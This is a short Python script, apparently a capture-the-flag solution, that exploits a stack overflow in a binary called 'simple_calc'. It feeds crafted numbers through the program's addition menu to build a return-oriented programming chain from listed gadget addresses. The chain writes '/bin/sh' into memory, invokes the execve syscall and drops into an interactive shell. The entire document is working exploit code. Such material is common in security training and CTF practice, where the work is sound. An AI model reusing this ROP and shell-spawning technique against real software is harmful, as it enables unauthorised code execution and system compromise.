from pwn import process, packing
import codecs
'''

0x00000000004b8f17 : pop rcx ; ret
0x0000000000437a85 # pop rdx ; ret
0x000000000040f173 : mov qword ptr [rdx], rcx ; ret

'''
pop_rcx = 0x00000000004b8f17
copy_bin_sh = 0x000000000040f173

# These two functions are what we will use to give input via addition
syscall = 0x0000000000400488
pop_rax = 0x000000000044db34  # pop rax ; ret
pop_rdi = 0x0000000000401b73  # pop rdi ; ret
pop_rsi = 0x0000000000401c87  # pop rsi ; ret
pop_rdx = 0x0000000000437a85  # pop rdx ; ret


def addSingle(p, x):
    p.recvuntil("=> ")
    p.sendline("1")
    p.recvuntil("Integer x: ")
    p.sendline('100')
    p.recvuntil("Integer y: ")
    p.sendline(str(x - 100))


def add(p, z):
    x = z & 0xffffffff
    y = ((z & 0xffffffff00000000) >> 32)
    addSingle(p, x)
    addSingle(p, y)


def exploit():
    # fill until rip
    prs = process("./simple_calc")
    prs.sendline('100')
    for _ in range(9):
        add(prs, 0)

    add(prs, pop_rdx)
    add(prs, 0x6c0900)

    add(prs, pop_rcx)
    add(prs, int.from_bytes(codecs.encode("/bin/sh\x00"), "little"))
    add(prs, copy_bin_sh)
    add(prs, pop_rax)
    add(prs, 0x3b)
    add(prs, pop_rdi)
    add(prs, 0x6c0900)
    add(prs, pop_rsi)
    add(prs, 0x0)
    add(prs, pop_rdx)
    add(prs, 0x0)
    add(prs, syscall)

    prs.sendline('5')
    prs.interactive()


if __name__ == '__main__':
    exploit()

